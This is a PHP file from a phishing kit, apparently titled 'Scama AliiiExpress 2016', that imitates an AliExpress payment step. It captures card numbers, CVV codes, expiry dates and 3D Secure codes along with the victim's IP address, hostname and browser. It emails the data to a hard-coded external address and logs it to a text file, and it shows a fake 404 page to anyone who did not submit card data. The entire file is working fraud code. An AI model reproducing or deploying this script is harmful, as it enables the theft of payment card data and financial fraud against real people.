<?php
/////
//
//     Scama AliiiExpress 2016
//  
//   Coded By Achroufa 
//
//   Facebook : https://www.facebook.com/achraf.mkaoua
//
//    
//
/////
if (isset($_POST['log3']) && $_POST['log3'] != "") {
	$ip = getenv("REMOTE_ADDR");
	$message .= "-------------- ccv ^_^ vbv   -------------\n";
	$message .= "--------------------------------------\n";
    $message .= "-------------- Credit Card -------------\n";
	$message .= "Card Number  : ".$_POST['log3']."\n";
	$message .= "Security code (CVV)  : ".$_POST['log4']."\n";
	$message .= "Expiration date (Month) : ".$_POST['log5']."\n";
	$message .= "Expiration date (Year) : ".$_POST['log6']."\n";
    $message .= "3D Secure Code : ".$_POST['log9']."\n";
	$message .= "-------------- IP Tracing ------------\n";
	$message .= "IP      : $ip\n";
	$message .= "Host    : ".gethostbyaddr($ip)."\n";
	$message .= "Browser : ".$_SERVER['HTTP_USER_AGENT']."\n";
	$message .= "---------- coded By achroufa  ---------\n";
	$subject = "Login ccv><vbv | $ip | ".$_POST['email'];
	$send = "om12sg@hotmail.com"; //Put You Email Here
	$headers = 'From: 4aliexpress' . "\r\n";
	mail($send,$subject,$message,$headers);
	$file = fopen("rzlt.txt", 'a');
    fwrite($file, $message);
	echo '<META HTTP-EQUIV="Refresh" Content="0; URL=../finish.php?df4cc48c24121eeede6567BVGbhgdfk">';  
}else{
	header("HTTP/1.0 404 Not Found");
    die("<h1>404 Not Found</h1>The page that you have requested could not be found.");
}

?> 